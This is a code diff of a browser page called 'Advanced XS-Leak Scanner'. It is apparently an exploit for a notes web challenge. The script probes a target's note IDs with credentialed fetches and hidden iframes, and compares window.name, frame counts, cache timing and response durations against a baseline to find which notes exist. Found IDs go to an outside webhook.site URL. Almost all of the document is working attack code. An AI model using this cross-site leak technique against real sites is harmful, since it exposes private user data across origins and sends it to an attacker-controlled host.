@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XS-Leak Note Finder (Improved)</title>
+    <title>Advanced XS-Leak Scanner</title>
 </head>
 <body>
     <h1>Scanning for notes...</h1>
@@ -11,11 +11,13 @@
         const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
         const START_ID = 1378;
         const END_ID = 2000;
-        const DELAY_MS = 200;          // delay between requests
-        const SAMPLES_PER_ID = 3;       // number of times to measure each ID (to reduce noise)
-        const BASELINE_ID = -1;          // a non‑existent ID to measure error response
+        const DELAY_MS = 500;            // delay between IDs (avoid rate limiting)
+        const BASELINE_ID = -1;            // non-existent ID for baseline
+        const CACHE_TIMEOUT = 100;         // timeout for cache probe (ms)
+        const POPUP_TIMEOUT = 2000;        // timeout for iframe load
 
-        let currentId = START_ID;
+        let baseline = { name: null, frames: null, cacheTime: null, duration: null };
+        let scanning = true;
 
         function updateStatus(msg) {
             const div = document.getElementById('status');
@@ -23,88 +25,152 @@
             console.log(msg);
         }
 
-        // Measure a single request and return its size (or duration as fallback)
-        function measureOnce(url) {
+        // ---------- 1. Iframe: window.name and frame count ----------
+        function checkIframeProps(url) {
             return new Promise((resolve) => {
-                // Use fetch with no-cors to ensure the request is sent and recorded
-                const start = performance.now();
-                fetch(url, { mode: 'no-cors', credentials: 'include' }).then(() => {
-                    // Wait for the performance entry to be written
-                    setTimeout(() => {
-                        const entries = performance.getEntriesByName(url);
-                        let size = 0;
-                        let duration = 0;
-                        if (entries.length > 0) {
-                            // Try to get the actual transferred size (most reliable)
-                            size = entries[0].transferSize || entries[0].encodedBodySize || 0;
-                            duration = entries[0].duration;
-                        }
-                        // If we have no size, fall back to duration (less reliable)
-                        if (size === 0 && duration > 0) {
-                            resolve({ size: 0, duration: duration });
-                        } else {
-                            resolve({ size: size, duration: duration });
-                        }
-                        // Clean up the performance entry to avoid memory growth
-                        performance.clearResourceTimings();
-                    }, 100);
-                }).catch(() => {
-                    // Network error – treat as failure
-                    resolve({ size: 0, duration: 0 });
-                });
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = url;
+                let resolved = false;
+
+                const timeout = setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        document.body.removeChild(iframe);
+                        resolve({ name: null, frames: null });
+                    }
+                }, POPUP_TIMEOUT);
+
+                iframe.onload = () => {
+                    clearTimeout(timeout);
+                    if (resolved) return;
+                    resolved = true;
+                    let name = null, frames = null;
+                    try {
+                        // These are readable cross-origin
+                        name = iframe.contentWindow.name;
+                        frames = iframe.contentWindow.length;
+                    } catch (e) {
+                        // Should not happen, but just in case
+                    }
+                    document.body.removeChild(iframe);
+                    resolve({ name, frames });
+                };
+                document.body.appendChild(iframe);
             });
         }
 
-        // Measure an ID multiple times and return the average size and duration
-        async function measureAverage(id, samples = SAMPLES_PER_ID) {
-            let totalSize = 0;
-            let totalDuration = 0;
-            let validSamples = 0;
-            const url = TARGET_BASE + id;
+        // ---------- 2. Cache probing ----------
+        // Measures first and second request times. If second is much faster, the resource was cached.
+        async function checkCache(url) {
+            // First request
+            const start1 = performance.now();
+            await fetch(url, { mode: 'no-cors', credentials: 'include' });
+            const end1 = performance.now();
+            const firstDuration = end1 - start1;
+
+            // Wait a moment (ensure the first request is fully processed)
+            await new Promise(r => setTimeout(r, 100));
+
+            // Second request
+            const start2 = performance.now();
+            await fetch(url, { mode: 'no-cors', credentials: 'include' });
+            const end2 = performance.now();
+            const secondDuration = end2 - start2;
+
+            // If second is significantly faster, assume cached
+            return { firstDuration, secondDuration, cached: secondDuration < firstDuration * 0.5 };
+        }
+
+        // ---------- 3. Simple timing (fallback) ----------
+        async function measureDuration(url, samples = 3) {
+            let total = 0;
             for (let i = 0; i < samples; i++) {
-                const { size, duration } = await measureOnce(url);
-                if (size > 0 || duration > 0) {
-                    totalSize += size;
-                    totalDuration += duration;
-                    validSamples++;
-                }
-                // Small delay between repeated measurements of same ID
-                await new Promise(r => setTimeout(r, 100));
+                const start = performance.now();
+                await fetch(url, { mode: 'no-cors', credentials: 'include' });
+                total += (performance.now() - start);
+                await new Promise(r => setTimeout(r, 50));
             }
-            if (validSamples === 0) return { avgSize: 0, avgDuration: 0 };
+            return total / samples;
+        }
+
+        // ---------- Baseline measurement ----------
+        async function measureBaseline() {
+            updateStatus(`Measuring baseline using ID ${BASELINE_ID}...`);
+            const baselineUrl = TARGET_BASE + BASELINE_ID;
+
+            // 1. window.name & frames
+            const { name, frames } = await checkIframeProps(baselineUrl);
+            updateStatus(`Baseline: name = "${name}", frames = ${frames}`);
+
+            // 2. Cache probe
+            const cacheResult = await checkCache(baselineUrl);
+            updateStatus(`Baseline cache: first ${cacheResult.firstDuration.toFixed(1)} ms, second ${cacheResult.secondDuration.toFixed(1)} ms, cached = ${cacheResult.cached}`);
+
+            // 3. Duration average
+            const avgDuration = await measureDuration(baselineUrl);
+            updateStatus(`Baseline duration: ${avgDuration.toFixed(1)} ms`);
+
             return {
-                avgSize: totalSize / validSamples,
-                avgDuration: totalDuration / validSamples
+                name: name,
+                frames: frames,
+                cacheTime: cacheResult.secondDuration, // we compare second request time later
+                cached: cacheResult.cached,
+                duration: avgDuration
             };
         }
 
-        // Measure baseline (non‑existent ID) to get typical error size/duration
-        async function getBaseline() {
-            updateStatus(`Measuring baseline using ID ${BASELINE_ID}...`);
-            const { avgSize, avgDuration } = await measureAverage(BASELINE_ID, SAMPLES_PER_ID);
-            updateStatus(`Baseline: size = ${avgSize.toFixed(1)} bytes, duration = ${avgDuration.toFixed(1)} ms`);
-            return { baselineSize: avgSize, baselineDuration: avgDuration };
-        }
-
-        // Decide if a response indicates a real note
-        function isPositive(measure, baseline) {
-            const sizeDiff = measure.avgSize - baseline.baselineSize;
-            const durationDiff = measure.avgDuration - baseline.baselineDuration;
-            // If we have size data, trust it more
-            if (baseline.baselineSize > 0 && measure.avgSize > 0) {
-                // Real notes are likely significantly larger than error pages
-                const sizeThreshold = baseline.baselineSize * 1.5; // at least 50% larger
-                return measure.avgSize > sizeThreshold;
-            } else {
-                // Fallback to duration – require at least 2x the baseline duration
-                return durationDiff > baseline.baselineDuration;
+        // ---------- Decide if candidate differs from baseline ----------
+        function isPositive(id, candidate, baseline) {
+            // If window.name is set and baseline name is null, that's a strong indicator
+            if (candidate.name !== null && candidate.name !== '' && baseline.name !== candidate.name) {
+                updateStatus(`  -> Positive: window.name differs (${candidate.name})`);
+                return true;
             }
+            // If frame count differs
+            if (candidate.frames !== null && candidate.frames !== baseline.frames) {
+                updateStatus(`  -> Positive: frame count differs (${candidate.frames} vs ${baseline.frames})`);
+                return true;
+            }
+            // If the second request was cached and baseline wasn't cached (or vice versa)
+            if (candidate.cached !== baseline.cached) {
+                updateStatus(`  -> Positive: cache behavior differs (candidate cached=${candidate.cached})`);
+                return true;
+            }
+            // If second request time is significantly different (e.g., > 2x baseline)
+            if (candidate.cacheTime && baseline.cacheTime && candidate.cacheTime > baseline.cacheTime * 2) {
+                updateStatus(`  -> Positive: second request time ${candidate.cacheTime.toFixed(1)} ms > 2x baseline ${baseline.cacheTime.toFixed(1)} ms`);
+                return true;
+            }
+            // If duration is significantly different (only if baseline duration is reliable)
+            if (candidate.duration && baseline.duration && candidate.duration > baseline.duration * 1.5) {
+                updateStatus(`  -> Positive: duration ${candidate.duration.toFixed(1)} ms > 1.5x baseline ${baseline.duration.toFixed(1)} ms`);
+                return true;
+            }
+            return false;
         }
 
+        // ---------- Check a single ID ----------
         async function checkId(id, baseline) {
-            const measure = await measureAverage(id);
-            updateStatus(`ID ${id}: size = ${measure.avgSize.toFixed(1)} bytes, duration = ${measure.avgDuration.toFixed(1)} ms`);
-            return isPositive(measure, baseline);
+            const url = TARGET_BASE + id;
+            updateStatus(`Checking ID ${id}...`);
+
+            // Get candidate properties
+            const { name, frames } = await checkIframeProps(url);
+            const cacheResult = await checkCache(url);
+            const duration = await measureDuration(url);
+
+            const candidate = {
+                name: name,
+                frames: frames,
+                cacheTime: cacheResult.secondDuration,
+                cached: cacheResult.cached,
+                duration: duration
+            };
+
+            updateStatus(`ID ${id}: name="${name}", frames=${frames}, cached=${cacheResult.cached}, duration=${duration.toFixed(1)} ms`);
+
+            return isPositive(id, candidate, baseline);
         }
 
         function reportId(id) {
@@ -114,13 +180,14 @@
         }
 
         async function run() {
-            const baseline = await getBaseline();
+            baseline = await measureBaseline();
             updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
             for (let id = START_ID; id <= END_ID; id++) {
+                if (!scanning) break;
                 const exists = await checkId(id, baseline);
                 if (exists) {
                     reportId(id);
-                    // Remove the following line if you want to continue scanning
+                    // If you want to stop after first found, keep the break; remove to continue
                     break;
                 }
                 await new Promise(r => setTimeout(r, DELAY_MS));
